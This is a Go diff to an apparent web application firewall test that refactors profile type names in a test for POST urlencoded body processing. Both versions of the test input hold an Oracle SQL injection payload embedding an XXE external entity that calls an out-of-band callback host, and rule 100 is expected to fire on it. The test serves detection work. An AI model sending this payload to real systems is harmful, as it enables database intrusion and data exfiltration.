@@ -5,24 +5,26 @@ import (
 )
 
 var _ = profile.RegisterProfile(profile.Profile{
-	Meta: profile.ProfileMeta{
+	Meta: profile.Meta{
 		Author:      "jptosso",
 		Description: "Test if the body processors work",
 		Enabled:     true,
 		Name:        "posturlencoded.yaml",
 	},
-	Tests: []profile.ProfileTest{
+	Tests: []profile.Test{
 		{
 			Title: "posturlencoded",
-			Stages: []profile.ProfileStage{
+			Stages: []profile.Stage{
 				{
-					Input: profile.ProfileStageInput{
-						URI:    "/",
-						Method: "POST",
-						Data:   `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`,
-					},
-					Output: profile.ExpectedOutput{
-						TriggeredRules: []int{100},
+					Stage: profile.SubStage{
+						Input: profile.StageInput{
+							URI:    "/",
+							Method: "POST",
+							Data:   `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`,
+						},
+						Output: profile.ExpectedOutput{
+							TriggeredRules: []int{100},
+						},
 					},
 				},
 			},
